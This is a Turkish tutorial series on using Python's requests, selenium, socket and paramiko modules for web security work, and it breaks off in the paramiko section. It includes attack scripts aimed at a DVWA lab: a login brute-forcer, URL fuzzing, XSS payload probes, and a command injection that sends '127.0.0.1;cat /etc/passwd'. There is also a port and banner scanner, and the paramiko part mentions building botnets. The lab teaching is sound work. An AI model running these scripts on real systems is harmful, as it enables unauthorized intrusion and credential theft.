# Hakerlar için Python

## requests


### Giriş

Merhaba, bu yazımızda web uygulama güvenliği alanında araçlar yazabileceğimiz python'un *requests* modülünü tanıyacağız.

### requests nedir?

[requests](https://requests.readthedocs.io/) python'un basit ama zarif bir HTTP modulüdür. HTTP isteklerini son derece kolay bir şekilde göndermenizi sağlar. GET metodu ile yapılan isteklerde URL'lerinize manuel olarak sorgu dizeleri eklemenize veya POST verilerinizi biçimsel olarak kodlamanıza gerek yoktur, requests modülü bu işleri sizin için halleder. Bu yazımızda *requests* ile çeşitli web toolları yazacağız ama önce kuruluma bir göz atalım. Python dilini temel olarak bildiğinizi varsayıp devam ediyoruz. Eğer isterseniz sitemizdeki python ile ilgili [yazılara](https://pwnlab.me/intermediate-python-articles/) da bakabilirsiniz.

### Kurulum

request modülünü kurmak için terminal ekranınıza aşağıdaki komutu yazabilirsiniz.

```
python -m pip install requests
```

kurulum tamamlandıktan sonra bir python dosyası oluşturup aşağıdaki kodu yazıp çalıştırdığınızda bir hata almıyorsanız, kurulumunuz başarılı demektir.

```
import requests
```

şimdi bu modülün yapısını biraz irdeleyelim.

#### Metotlar

request modülünün birçok metodu olsa da bizim için önemli olan GET ve POST isteklerini yaptığımız metotlardır. Bunların ne olduğunu bilmiyorsanız [HTTP request](https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods) metotlarını araştırabilirsiniz.

`get()`: En çok kullandığımız istek türü GET isteğidir. Tarayıcımızda herhangi bir web sayfasına girdiğimizde aslında GET isteği atmış oluruz. Bir URL adresine GET isteği attığımzda bize sayfanın HTML dökümünü (sayfa kaynağını) döndürür, tarayıcımız bu HTML'i yorumlayarak bize sayfayı gösterir. (Sadece HTML değil beraberinde CSS ve Javascript kodları da geliyor ama onlarla işimiz yok) `requests.get()` metodu ile GET istekleri yapabiliriz. Kullanımı temel olarak aşağıdaki gibidir: `get(url, params, args)`

`post()`: POST metodu genellikle [HTML formlarını](https://www.w3schools.com/html/html_forms.asp) gönderirken (submit) kullanılan metottur. Giriş ve kayıt sayfalarında bu metot kullanılır. Yani bir giriş sayfasına kaba kuvvet saldırısı yapmak için bu metodu kullanacağız. GET metodundan farklı olarak bu metodla gönderdiğimiz parametreler/veri URL'e eklenmez. POST istekleri göndermek için `requests.post()` metodu kullanılır. Kullanımı temel olarak aşağıdaki gibidir: `post(url, data, json, args)`

#### Parametreler

`url`: GET veya POST isteğini göndereceğimiz web sayfasının adresidir.

`params`, `data`, `json`, `files`: Bu parametreler GET veya POST isteğiyle göndereceğimiz parametreler/veridir. `params` `get()` metodunda, diğerleri ise `post()` metodunda kullanılır. Bu metotların kullanımı hedef siteye bağlıdır; eğer hedef site bir parametre değeri almıyorsa kullanımına gerek yoktur. Eğer parametre alıyorsa, yani bir HTML formu varsa, `name` etiket değerlerine istenilen verileri göndermemiz gerekir.

* `params`: `get()` metodunda *dictionary* veya *tuple* yapısında parametre/veri alır.
* `data`: `post()` metodunda *dictionary*, *tuple* veya bytes yapısında parametre/veri alır.
* `json`: `post()` metodunda *json* yapısında parametre/veri alır.
* `files`: `post()` metodunda XML veya farklı dosya türlerinde parametre/veri alır.

GET isteğinde parametreler yani veri URL'in devamına eklenir. Bu yüzden direkt URL'i düzenleyerek parametreleri ekleyebiliriz ya da get() metodunun *params* parametresine *dictionary* yapısında verileri verebiliriz. Bunun için:

```python
params = {'key1': 'value1', 'key2': 'value2'}
```

şeklinde sözlük (dictionary) yapısında parametreleri tanımlarız. Bu parametreler ile bir istek yaptığımızda parametreler aşağıdaki şekilde URL'in sonuna eklenir:

```
https://httpbin.org/get?key2=value2&key1=value1
```

Şimdi küçük bir Python kodu yazarak GET isteği gönderelim:

```python
import requests  
params = {'key1': 'value1', 'key2': 'value2'}  
response = requests.get('https://httpbin.org/get', params=params)
```

POST isteğiyle veri göndermenin farklı yolları vardır. GET isteğinde olduğu gibi sözlük yapısında veya json yapısında veri gönderilebilir. Sözlük yapısında veri göndermek için:

```python
data = {'key1': 'value1', 'key2': 'value2'}
```

json yapısında veri göndermek için [json](https://docs.python.org/3/library/json.html) modülünü kullanabilirsiniz.

#### args

Argümanlar get() ve post() metotları için aynıdır ve kullanımları isteğe bağlıdır; kullanılmadığı takdirde varsayılan değerleri ile yürütülür.

* `allow_redirects` (bool): Yeniden yönlendirmeyi etkinleştirmek/devre dışı bırakmak için TRUE/FALSE değeri alır. Varsayılan olarak TRUE'dur, yani yönlendirmelere izin verir.
* `auth` (tuple): Belirli bir HTTP kimlik doğrulamasını etkinleştirmek için kullanılır. Varsayılan olarak NULL değeri alır, kimlik doğrulaması yapmaz.
* `cert` (tuple): Bir sertifika dosyasını *tuple* yapısında alır. Varsayılan olarak NULL değeri alır.
* `cookies` (dict): Belirtilen url'ye gönderilecek çerez sözlüğünü alır. Varsayılan olarak çerez göndermez.
* `headers` (dict): Belirtilen url'ye gönderilecek HTTP headerını alır. Varsayılan olarak header göndermez.
* `proxies` (dict): Proxy URL'sine gönderilecek protokolü alır. Varsayılan olarak NULL değeri alır.
* `stream` (bool): Yanıtın hemen indirilmesi (FALSE) veya akışa alınması (TRUE) değeri ile belirlenir. Varsayılan olarak FALSE değerini alır yani yanıt hemen indirilir.
* `timeout` (int): İstemcinin bağlantı kurması ve/veya yanıt göndermesi için kaç saniye bekleneceğini gösteren timeout süresini alır. Varsayılan olarak NULL değer alır, bu da isteğin bağlantı kapatılana kadar devam edeceği anlamına gelir.
* `verify` (bool): Sunucuların TLS sertifikasını doğrulamak için TRUE, doğrulamayı kapatmak için FALSE değer alır. Varsayılan olarak TRUE değerdedir.


#### response

Sunucunun gönderdiğimiz isteğe döndüğü yanıttır. Yazdığımız python kodlarında *get()* metodu ile aldığımız cevabı *response* isimli bir değişkende tutmuştuk. Şimdi bu cevabın içeriğini irdeleyelim.

```
print(response.text)
```

ile response'in içeriğini text olarak yadırabiliriz. Karşımıza aşağıdaki gibi bir metin çıkacaktır.

```
{  
"args": {  
"key1": "value1",   
"key2": "value2"  
},   
"headers": {  
"Accept": "*/*",   
"Accept-Encoding": "gzip, deflate",   
"Host": "httpbin.org",   
"User-Agent": "python-requests/2.28.1",   
"X-Amzn-Trace-Id": "Root=1-62e23811-6a7c14dc2c3bc62026eebb0c"  
},   
"origin": "185.51.36.100",   
"url": "https://httpbin.org/get?key1=value1&key2=value2"  
}
```

Burada aldığımız cevap ile ilgili bilgiler görüyoruz. Ayrıca aldığımız response'un tipine bakalım.

```
>>print(type(response))
```

```
<class 'requests.models.Response'>
```

requests.models.Response türünde bir nesne olduğunu anlıyoruz. [Kaynak koduna](https://requests.readthedocs.io/en/latest/_modules/requests/models/) baktığımzda:


uzunca bir kod görüyoruz. Kendi dökümantasyonuna da [buradan](https://requests.readthedocs.io/en/latest/api/#requests.Response) ulaşabilirsiniz. Bizim için burada önemli olan \_\_attrs\_\_ kısmında yazan attiributeleridir.

```
print(response.__attrs__)
```

```
['_content', 'status_code', 'headers', 'url', 'history', 'encoding', 'reason', 'cookies', 'elapsed', 'request']
```

Ayrıca yukarıdaki kod ile de bu attiributeleri görebiliriz. Bu attiributeler ile *response.text* aldığımız metinde yazan değerlere ulaşabiliriz ama burda bizim için önemli olan *content* 'tir.

```
print(response.content)
```

bize sayfa kaynağını döndürecektir. Şimdi verilen websitesinin adresini alan ve kaynağını bir html dosyasına kaydeden bir uygulama yapalım.

```
import requests
```

```
response = requests.get('https://www.google.com.tr')  
f = open("source.html","w")  
f.write(str(response.content))  
f.close()
```

sayfa kaynağının aşağıdaki gibi çekildiğini görebilirsiniz. (CSS ve Javascript kodlarıyla birlikte)


Sayfa kaynağını [BeautifulSoup](https://pypi.org/project/beautifulsoup4/) modülü ile ayrıştırabilir içinden istedğiniz bilgileri alabilirsiniz. Ama bu yazımızda daha farklı şeyler yapacağız.

### Usomdan zararlı web sitelerini çekme

[USOM](https://www.usom.gov.tr/)(Ulusal Sİber Olaylara Müdahale Merkezi) ülkemizde ki siber olaylara karşı 7/24 çalışma esasında göre faaliyet gösteren bir oluşumdur. İnternetteki zararllı siteleri indekslediği bir listesi bulunmaktadır. Bu listeye [buradan](http://www.usom.gov.tr/url-list.txt) ulaşabilirsiniz. Şimdi python ile bu listeyi çekmeye çalışalım.

```
import requests  
response = requests.get("http://www.usom.gov.tr/url-list.txt", verify=False)  
with open("usom.txt", "wb") as binary_file:  
  binary_file.write(response.content)
```

Basit bir GET isteği ile bu listeyi çekebildik. Şimdi elimizde olan bir URL'in bu listede yer alıp almadığını kontrol eden bir fonksiyon yazalım.

```
def check(url):  
  f = open("usom.txt")  
  lines = f.read()  
  lines =lines.split('\n')  
  for line in lines:  
    if line == url:  
    text = url+" zararlıdır"  
    return text
```

```
  text = url+" zararlı değildir."  
  return text
```

Fonksiyona verdiğimiz URL'i aldığımız metin dosyasında arayarak bulduğu takride bize zararlı olduğunu bulamadığı taktirde zararsız olduğunu döndüren bir uygulama yapmış olduk.

### Kaba Kuvvet Saldırısı

Kaba Kuvvet Saldırısı, doğrusunu bulma umuduyla deneme yanılma yönetimi kullanarak bir web sayfasına giriş yapmak için kullanabileceğimiz basit ancak hala etkili bir saldırı türüdür. Bunu python uygulamamızla nasıl yapabileceğimize bir bakalım. Bunun için DVWA uygulamasını kullanacağım.


Burada giriş sayfamı [burp suite](https://portswigger.net/burp) aracıyla dinledim. username ve password alanlarına 'aa' değerini girerek login butonuna bastım. Yapılan GET isteği burp aracım üzerinde HTTP History bölümünde yakalanmış oldu. Tabi bunun için faklı araçlar da kullanabilirsiniz. Biz buradaki bazı bilgileri kullanacağız. Öncellikle DVWA sayfasına oturum açarak eriştiğimiz için python uygulamamızında bir şekilde oturuma erişmesi gerekiyor. Peki oturum nedir? kısaca bahsedecek olursak, bir giriş sayfasından kullanıcı adı/şifre bilgilerimizle giriş yaptığımızda aslında bir oturum başlatmış oluruz. İşimiz bitip tarayıcımızı kapattığımızda veya üzerinden belli bir süre geçtiğinde oturum sonlandırılır. Web uygulamaları oturum oluştururken çerelerden(cookie) yararlanır, bir çerez istemci bilgisayarında bir çerez sunucuda olmak üzere iki çerez oluşturulur. Bu iki çerez de kaybolmadığı sürece oturum devam eder. Biz burada DVWA sayfasına giriş yaparak aldığımız oturum çerezini python uygulamamıza vererek bizim otururumuz ile web sayfasına erişmesini sağlayacağız. Burp aracında işaretli alan 'PHPSESID' bizim oturum çerezimizdir. Yalnız acele etsek iyi olur, oturumun süresi bitiyor”¦

```
import requests
```

```
header = {"Cookie": "security=low; PHPSESSID=2d9gb38rft9o87vv22vbtnlu91"} #oturum çerezini header'a veriyoruz.
```

```
usernames = ["admin", "root", "user", "aa"]       #denemelerde kullanacağımız kullanıcı adı listesi  
passwords = ["resu", "password", "toor", "1234"]  #denemelerde kullanacağımız şifre listesi
```

```
for i in usernames:  
  for j in passwords:  
    url = f"http://10.0.2.4/dvwa/vulnerabilities/brute/?username={i}&password={j}&Login=Login"  
    #Uygulamımız GET isteğiyle çalıştığı için username ve password bilgilerini URL'e ekleyerek deneyebiliriz.  
    result = requests.get(url=url, headers=header)  
    if not "Username and/or password incorrect" in str(result.content):  
      print("Username: ", i)  
      print("password: ", j)  
      print("Status code: ",result.status_code)  
      print("Length: ", len(result.content))  
      print("Username and Password is found")
```


Kodu python dosyasına yazıp çalıştırdığımızda canlıdaki DVWA sunucusuna GET istekleri göndererek denemeler yapacaktır.

Ve evet saldırımız başarılı kullanıcı adı ve şifre bilgisini bulduk. Bu web sayfasında GET metodu kullanıldığı için saldırıyı URL üzerinde düzenleme yaparak kolayca gerçekleştirebildik. Eğer POST metodu kullanılmış olsaydı HTML formundaki *name* niteliklerinin isimlerine göre bir tuple oluşturup post() metodunun *data* parametresine verip saldırımızı gerçekleştirebilirdik. Bu kadar ipucu yeter, gerisi sizde”¦

### URL Fuzzing

URL Fuzzing işleminde olası dosya/dizin isimlerinin yer aldığı bir liste oluşturulur ve bununla sisteme http isteği attırılır. Bu sayede sunucu üzerindeki dizinler ve dosyalar bulunmaya çalışılır. Tabi bu işlemi manuel olarak tek tek deneyerek yapmak yorucudur. Bunun için küçük bir python kodu yazmaya ne dersiniz?

```
import requests
```

```
fuzzing_list = ['/robots.txt','/etc/','/dvwa/','/passwd','/usr/','/index.php'] #arama yapacağımız liste  
header = {"Cookie": "security=low; PHPSESSID=0k6634cfi19e5sfn2vb754uns6"} #dvwa üzerindeki oturum çerezimiz
```

```
for i in fuzzing_list:  
  url = "http://10.0.2.4"+str(i) #dvwa sunucusunun ip adresi devamına fuzzing denemeleri yapıyoruz  
  result = requests.get(url = url, headers = header)  
  if "200" in str(result.status_code):  
    print("file or directory is found: ",i)  
  else:  
    print("file or directory isn't found: ",i)
```

python kodunu çalıştırdığımızda listedeki dizin ve dosya adlarını deneyerek bize aşağıdaki sonucu verecektir.


### XSS Saldırısı

**XSS**, temelinde web sayfası girdilerinden alınan değerlerin filtrelenmeden sayfa kaynağına dahil edilmesi sonucu ortaya çıkan bir güvenlik zafiyetidir. Bunun nedeni filtrelenmeyen girdilerden sayfaya zararlı javascript kodlarının dahil edilebilecek olmasıdır. Bu zafiyeti açığa çıkarabilecek birçok XSS scripti bulunmaktadır. Github üzerinde bulduğum bir listeye [buradan](https://github.com/payloadbox/xss-payload-list) ulaşabilirsiniz. Bu uygulamamızda, XSS scriptlerini içeren bir listedeki değerleri sayfaya göndererek sayfa kaynağına eklenip eklenmediğini kontrol eden bir uygulama yapacağız. Bunun için bir önceki uygulamada yaptığımız oturum çerezini yine header değişkenine verdim, bu kısmı bir daha anlatmıyorum.

DVWA sayfamız yine GET isteğiyle çalışıyor, bu yüzden *requests.get()* fonksiyonunu kullanacağız. Girdi bölümüne yazdıklarımız URL'de *name* bölümüne yazılıyor. Buradan hareketle biz de XSS scriptlerimizi *name* parametresine vereceğiz.

```
import requests
```

```
header = {"Cookie": "security=low; PHPSESSID=2d9gb38rft9o87vv22vbtnlu91"}  
xss_list = ["<h1>xss</h1>","&lt;script&gt;alert-msg('xss')&lt;/script&gt;","&lt;script&gt;prompt('xss')&lt;/script&gt;","XSS","alert-msg('xss')"]
```

```
for payload in xss_list:  
  url="http://10.0.2.4/dvwa/vulnerabilities/xss_r/?name="+payload #name parametresine scriptlerin verilmesi  
  result = requests.get(url=url, headers=header) # GET isteğinin yapılması  
  if str(payload) in str(result.content):  
    print("Muhtemel XSS bulundu: "+str(payload))
```

Kodu python dosyasına yazıp çalıştırdığımızda canlıdaki DVWA sunucusuna GET istekleri göndererek denemeler yapacaktır.


Aldığımız sonuca bakarsak, web sayfası filtreleme yaptığı için XSS scriptlerimiz çalışmadı. <h1>xss</h1> HTML injection scriptiydi, XSS ise düz bir stringden ibaret. Siz daha farklı XSS scriptleri deneyebilirsiniz.

### Command Injection Saldırısı

Command injection,kod çalıştırma açıklığı olarak da bilinen bir zafiyet çeşididir. Girdiler filtrelenmeden sunucu shellinde çalıştırılması bu zafiyeti doğuruur. Saldırgan bu sayede istediği zararlı kodları sunucu shellinde çalıştırabilir. Uygulamamızda DVWA'nın command injection web sayfasını kullanacağız.


Burada verilen ip adresine ping atan bir girdi bulunuyor. ip'nin devamına noktalı virgül atıp ls komutunu çalıştırmayı denediğimizde, çalıştıığını ve sunucu dizinini bize listelediğini görürürüz. Buradan hareketle bu sayfada comman injection zaafiyeti olduğunu belirleyebiliriz. Şimdi python ile nu zafiyeti nasıl tesğit edebileceğimize bakalım.


Sayfaya gönderdiğimiz isteği burp ile dinlediğimizde bu isteğin bir POST metodu ile yapıldığını ve gönderilen parametreleri görebiliyoruz. Önceki uygulamalarda yaptığımız gibi yine oturum çerezimizi('PHPSESSID) header parametremize vereceğiz. Devamında POST isteği olduğu için bir data tuple yapısı oluşturacağız ve bunu post() metodumuza vereceğiz.

```
import requests
```

```
command = "cat /etc/passwd"  #çalıştırmak istediğimizz komut  
header = {"Cookie": "security=low; PHPSESSID=0k6634cfi19e5sfn2vb754uns6"} #oturum çerezi  
url = "http://10.0.2.4/dvwa/vulnerabilities/exec/" #saldırı yapacağımız web adresi  
data = {"ip":"127.0.0.1;"+command,"Submit":"Submit"} #POST metoduyla göndereceğimiz paramaetreler  
response = requests.post(url=url, data=data, headers=header) #isteğin gönderilmesi
```

```
if "www-data" in str(response.content):  
  print("command injection zafiyeti bulundu!")
```

'www-data' gelen cevapta bulunduğunda komutun çalıştığını anlayabileceğimiz bir stringden ibaret, passwd dosyası içinde bulunuyor. Bu yöntemi kullanarak daha uzun komutları sırayla python ile çalıştırabilirsiniz.


Sonuç olarak, python kodunu çalıştırarak zafiyeti bulmuş olduk.

### Son

python ile web güvenliği alanında yapabileceğimiz başka ne tür işlemler olabilir yorumlara beklerim”¦

## selenium


### Giriş

Merhaba bu yazımızda web siteleri üzerinde bir kullanıcı gibi işlemler yapmamızı sağlayan selenium modülünü tanıyacağız.

### Selenium Nedir?

[Selenium](https://selenium-python.readthedocs.io/) bir web otomasyon kütüphanesidir. Selenium ile bir web sitesini ziyaret edip etkileşimde bulunabiliriz.

### Kurulum

[Selenium](https://pypi.org/project/selenium/) modülünü kurmak ve çalıştırmak için birkaç farklı yöntem izleyebilirsiniz. Herşeyi manuel olarak kurup bilgisayarınızda çalıştırabilirsiniz, tarayıcınızı çalıştıracak driverı otomatik kurabilirsiniz veya docker teknoloisinden faydalanabilirsiniz.

Klasik manuel kurulumdan başlayalım;   
Bunun için aşağıdaki komutu terminalde çalıştırın.

```
pip install selenium
```

Selenium bir web tarayıcı üzerinde çalıştığı için bu tarayıcı yönetecek bir drivera ihtiyacımız var.

**Chrome**:  
<https://chromedriver.chromium.org/downloads>

**Edge**:  
<https://developer.microsoft.com/en-us/microsoft-edge/tools/webdriver/>

**Firefox**:  
<https://github.com/mozilla/geckodriver/releases>

**Safari**:  
<https://webkit.org/blog/6900/webdriver-support-in-safari-10/>

Buradan kullanmak istediğiniz tarayıcının driverini indirebilirsiniz Driverı indirirken tarayıcınızın sürümü ile uyumlu olmasına dikkat edin. Ardından driverı python dosyanızla aynı dizine kopyalayın.

Şimdi ilk test kodumuzu çalıştırabiliriz.

```
from selenium import webdriver  
driver = webdriver.Chrome()  
driver.get("http://google.com")
```

Driverı elle kurmak yerine otomatik olarak son sürümü kuran webdriver\_manager modülünü de kurabiliriz.

```
pip install webdriver-manager
```

Bu modülü kurduktan sonra aşağıdaki test kodunu çalıştırabiliriz.

```
from selenium import webdriver  
from webdriver_manager.chrome import ChromeDriverManager
```

```
driver = webdriver.Chrome(ChromeDriverManager().install())  
driver.get("http://google.com")
```

Seleniumu [docker](https://hub.docker.com/r/selenium/standalone-firefox) ile çalıştırmak için ise [github](https://github.com/SeleniumHQ/docker-selenium) sayfasınındaki yönlendirmeleri izleyebilirsiniz. Dockerı kurup çalıştırınca [http://localhost:4444](http://localhost:4444/) adresinde seslenium grid arayüzüne erişebilirsiniz.


<http://localhost:7900/> adresinden de web tarayıcıyı görüntüleyebiliriz. Varsayılan parola *secret* dır.  
 Docker ayakta iken aşağıdaki test kodunu çalıştırabiliriz.

```
from selenium import webdriver  
from selenium.webdriver.common.keys import Keys  
from selenium.webdriver.common.desired_capabilities import DesiredCapabilities  
					   
driver = webdriver.Remote(  
   command_executor="http://127.0.0.1:4444/wd/hub",  
   desired_capabilities={"browserName": "firefox"})  
driver.get("http://google.com")
```

Burada browserName kısmına dockerı hangi browser ile kurduysanız o browserın ismini yazmalısınız. Kodu çalıştırılınca <http://localhost:7900/> adresi üzerinde google'ın açıldığını görebilirsiniz.


Python kodu çalıştırıldı ve selenium grid üzerinde bir sesssion oluşturuldu. Bu session ile google.com adresine gittik. Ancak bu oturumu kapatmadan python kodumuz sonlandı ve oturumumuz açık kaldı. Sessionı kapatmadan başka python kodları çalıştıramayız. Oturumu kapatmak için python kodumuzun sonuna *driver.quit()* ekleyebiliriz ya da docker'ı yeniden başlatabilrisiniz.

### Selenium Modülü Nasıl Kullanılır?

Kurulum kısmında selenium ile tarayıcıyı açmayı ve bir sayfaya gitmeyi görmüştük. Sayfaya gittikten sonra o sayfada çeşitli işlemler yapabiliriz. Örneğin sayfadaki belli bir metini almak isteyebiliriz, sayfadaki bir butona basmak isteyebiliriz veya sayfayı yukarı-aşağı kaydırmak isteyebiliriz. Bunların hepsi bot yapımında bizim için gereken işlemlerdir.

Web sayfası üzerinde her ne yapmak istersek isteyelim önce o işlemi yapacağımız HTML elemenına erişmemiz gerekir. Bunun için birkaç farklı yol var. Bunlardan bazıları:,

* ID: Elemena bir id değeri atanmışsa bu değer ile elemana erişebiliriz. Id değerleri benzersizdir.
* NAME: Elemana bir name değeri atanmışsa bu değer ile elemana erişebiliriz. Name değerleri benzersiz değildir, bir sayfada aynı name değerinde başka elemanlar olabilir. Bu durumda ilk bulduğunu alır.
* CLASS: Elemana bir class değeri eklenmişse bu class değeri ile erişebiliriz.
* XPATH: Sayfa kaynağında erişmek istediğimiz elemanın xpath'ini vererek erişebiliriz. Xpath'i inspector aracından kopyalayabiliriz.


Burada Google'daki arama çubuğunun XPath'ini almış olduk. Şimdi küçük bir örnek uygulama üzerinde temel mantığı anlamaya çalışalım.

```
#import işlemleri
```

```
from selenium import webdriver                    
from selenium.webdriver.common.keys import Keys  
from selenium.webdriver.common.by import By  
import time
```

```
#driver nesnesini çağır (Ben seleniumu docker üzerinde çalıştırdım)					
```

```
driver = webdriver.Remote(  
   command_executor="http://127.0.0.1:4444/wd/hub",  
   desired_capabilities={"browserName": "firefox"})
```

```
driver.get("https://github.com") #github web sayfasına git
```

```
# XPATH ile github sayfasındaki arama çubuğuna eriş  
searchInput = driver.find_element(By.XPATH, "/html/body/div[1]/header/div/div[2]/div[2]/div[1]/div/div/form/label/input[1]")
```

```
time.sleep(1)  
searchInput.send_keys("CVE") # arama çubuğuna 'CVE' yaz.  
time.sleep(3)  
searchInput.send_keys(Keys.ENTER) # arama çubuğunda ENTER'a bas.  
time.sleep(5)
```

```
driver.quit()
```

Örnek uygulamayı çalıştırdığımızda, github web sayfası açılır, arama çubuğunu CVE yazılıp arama sayfasına gidilir. Ardından 5 saniye sonra tarayıcı kapanacaktır.


Burada çıkan sonuçları çekip indeksleyebiliriz. Bu işleme web scraping diyoruz.

### Shodan

Şimdi Shodan üzerinde çalışan bir web botu uygulaması yapalım. Bunun için [shodan.io](https://www.shodan.io/)'a girip buradaki arana çubuğununun Xpath değerini kopyalıyoruz. Bu değeri uygulamamızda arama çubuğuna erişmek için kullanacağız.


Şimdi kodumuzu yazmaya başlayabiliriz. Öncellikle yukarıda bahsettiğimiz gibi import işlemlerini yapıp driver nesnemizi oluşturacağız. Ardından aldığımız xpath değeri ile arama çubuğuna sorgulayacağımız değeri gönderip '*ENTER'* değerini göndereceğiz.

```
from selenium import webdriver  
from selenium.webdriver.common.keys import Keys  
from selenium.webdriver.common.by import By  
import time
```

```
driver = webdriver.Remote(  
   command_executor="http://127.0.0.1:4444/wd/hub",  
   desired_capabilities={"browserName": "firefox"})
```

```
driver.get("https://www.shodan.io/")
```

```
searchInput = driver.find_element(By.XPATH, "/html/body/div[2]/div/div/div[1]/form/div/div/input")
```

```
searchInput.send_keys("phpMyAdmin", Keys.ENTER)
```

```
time.sleep(10)  
driver.quit()
```

Uygulamamızı çalıştırdığımızda arama çubuğuna 'phpMyAdmin' yazıp sorgulayacaktır. Şimdi dönen değerleri almaya çalışalım.


Gördüğümüz gibi dönen bütün sonuçların class isimleri 'result' olarak atanmış. Bu durumdan yararlanarak gelen sonuçlara erişebiliriz.

```
results = driver.find_elements(By.CLASS_NAME, 'result')  
print(results)
```


Burada alınan elementleri görebiliyoruz.

### Twitter Bot

Twitterdaki bot hesapları elbet duymuşsunuzdur. Bu botlar sosyal medya hesaplarını otomatize etmenin yanı sıra, Twitter üzerinde yapay gündem oluşturmak, çeşitli manipülasyon ve propaganda faaliyetleri için de kullanılıyor. Twitter bot hesapları engellemek için çeşitli önlemler alıyor. Örneğin, agresif biçimde hızlı işlem yapan kullanıcıları yakalıyor. Bunun dışında elemanlara erişimi zorlaştırmak için id, name değerleri ile oynuyor, xpath'i işlevsiz kılıyor.   
   
 Twitterın eski versiyonunda selenium ile yazılmış bot örneklerini webde kolayca bulabilirsiniz. Ne yazık ki bugünkü versiyonunda bu botlar çalışmıyor.   
 Bunun dışında Twitterın kendi apisi ile çeşitli uygulamalar hazırlayabilirsiniz. Ancak apiler tamamen twitterın denetimine tabi. Kısacası Twitter tamamen kontrolü eline aldı diyebiliriz.  
   
 Aynı durum instagram ve facebook içinde geçerlidir. Birçok web uygulaması botlara karşı önlemler almış durumda.

### Son

Sonuç olarak, selenium modülü gerçek bir browser üzerinde otomatize işlemler yapmamıza, botlar oluşturmamıza yardımcı olan güzel bir modül ancak bazı web uygulamaları bu botlara karşı önlemler almış durumda. Selenium ile başka ne tür uygulamalar yapılabilir yorumlara beklerim”¦

## socket


### Giriş

Merhaba bu yazımızda, uzak sunucuların ip ve port adreslerine bağlantı kurmak için kullanabileceğimiz socket modülünü tanıyacağız.

### Socket nedir?

[Socket](https://docs.python.org/3/library/socket.html#module-socket) python ile birlikte kurulu halde gelen bir modüldür. Bu modül sayesinde, istenilen ip ve port adresine bağlantı kurabiliriz. Şimdi gelin bu modülü nasıl kullanacağımıza ve bu modül ile neler yapabileceğimize bir bakalım.

### Socket modülü nasıl kullanılır?

Öncelikle socket modülünü import edip bir socket objesi oluşturmamız gerekiyor, bunun için;

```
import socket
```

```
new_socket = socket.socket()
```

sonra bu objenin metotlarını kullanarak işlemlerimizi yapacağız, bu metotlar:

* `socket.listen()`: Belirtilen port numarasında açılan sokette dinleme yapar.
* `socket.accept()`: Belirtilen port numarasında açılan sokete gelen istekleri alır.
* `socket.bind(address)`: Soketi belirtilen IP adresine bağlar.
* `socket.close()`: Soketi kapatır.
* `socket.connect(address)`: Belirtilen adresteki uzak bir sokete bağlanır.
* `socket.recv(bufsize)`: Sokete gelen veriyi alır.
* `socket.sendall(bytes)`: Sokete veri gönderir.

### Soketi dinleme

Soket açarak belirli bir portu dinleyebiliriz.

```
import socket
```

```
HOST = '127.0.0.1'                   
PORT = 2222                
with socket.socket() as s:  
    s.bind((HOST, PORT))  
    s.listen()  
    conn, addr = s.accept()  
    with conn:  
        print('Connected by ', addr)  
        while True:  
            data = conn.recv(1024)  
            if not data: break  
            conn.sendall(data)
```

Bu kod 127.0.0.1:2222 adresinde açılan soketi dinleyecek, bir bağlantı yakaladığında gelen veriyi aynı şekilde geri gönderecektir. Ardından program sonlanır.

### Sokete bağlanma

Soket açarak belirli bir ip adresi ve porta bağlantı kurabiliriz.

```
import socket
```

```
HOST = '127.0.0.1'      
PORT = 2222             
with socket.socket() as s:  
    s.connect((HOST, PORT))  
    s.sendall(b'Merhaba')  
    data = s.recv(1024)  
print('Received ', data)
```

Bu kod 127.0.0.1:2222 adresinde çalışan soketle bağlantı kuracak bir bir data gönderecektir. Burada gönderilen data 'merhaba' mesajıdır. Ardından karşıdan gelen datayı alır ve program sonlanır.


Soket dinlediğimiz kodu *server.py i*simli bir dosyaya kaydedelim. Sokete bağlandığımız kodu ise *client.py* isimli bir dosyaya kaydedelim. Önce server.py dosyasını sonra client.py dosyasını çalıştırdığımızda bağlantı kurulmuş olacaktır.

### Port Taraması

Socket modülü ile ip ve port adreslerine bağlantı kurabiliyorduk. Bu sayede bir host üzerinde açık portları ve banner bilgilerini bulabiliriz. Banner bilgileri bu portta hangi servisin çalıştığı hakkında bize bilgi verecektir.

```
import socket
```

```
ip = "10.10.10.10"  
ports = []  
banners = []
```

```
for port in range(1,1000):  
    try:  
        s = socket.socket()  
        s.connect((str(ip), int(port)))  
        banner = s.recv(1024)  
        banners.append(str(banner))  
        ports.append(str(port))  
        s.close()  
        print(port)  
    except:  
        pass  
          
print(ports)  
print(banners)
```

Typhoon makinesi üzerinde bu kodu çalıştırırsak bize açık portları ve banner bilgilerini gertirir.


### SSL

Https protokolü ile çalışan güvenli sitelere erişmeye çalıştığımızda bir SSL sertifikasına ihiyaç duyarız. Bunun için ssl modülünden yardım alabiliriz.

Varsayılan olarak http protokolü 80, https protokolü 443 portlarında çalışır.

```
import socket  
import ssl
```

```
hostname = 'www.python.org'  
context = ssl.create_default_context()
```

```
with socket.create_connection((hostname, 443)) as sock:  
    with context.wrap_socket(sock, server_hostname=hostname) as ssock:  
        print(ssock.version())
```

### Son

Bu modül ile siber güvenlik alanında yapabileceğimiz başka ne tür işlemler olabilir? Yorumlara beklerim”¦

## paramiko


### Giriş

Merhaba, bu yazımda Python ile SSH bağlantıları kurmamızı sağlayan *paramiko* modülünü tanıyacağız.

### paramiko nedir?

**SSH** (Secure Shell), ağ hizmetlerinin güvenli olmayan bir ağ üzerinde güvenli şekilde çalıştırılması için kullanılan bir kriptografik ağ protokolüdür. SSH ile ağ cihazlarınıza, linux ve windows makinelere bağlanabilir ve onları yönetebilirsiniz. Ön tanımlı olarak 22 portunda çalışır.

Paramiko Python ile SSH bağlantılarını kolaylıkla yapmamızı sağlayan bir modüldür. Bu sayede Python ile uzak sunucuları yöneten uygulamalar yazabiliriz. Örneğin; bir botnet kurabilir, uzak bir sunucu üzerinde zararlı yazılım çalıştırabilir ya da SSH zafiyetlerini tarayan uygulamalar yazabiliriz. Şimdi bu modülü nasıl kullanacağımıza bir bakalım.

### Kurulum

Paramiko kurulumu için aşağıdaki aşağıdaki kodu terminal ekranında çalıştırınız.

```
pip install paramiko
```

Ardından bir python dosyası açıp modülü projemize dahil edebiliriz.

```
import paramiko
```

şimdi paramiko modülü ile bir SSH bağlantısı yapalım

### Paramiko Modülü nasıl kullanılır?

Paramiko modülü ile SSH bağlantısı kurmak için;

```
import paramiko
```

```
IP = "ip adresi"  
USERNAME = "kullanıcı adı"  
PASSWORD = "şifre"  
PORT = 22  
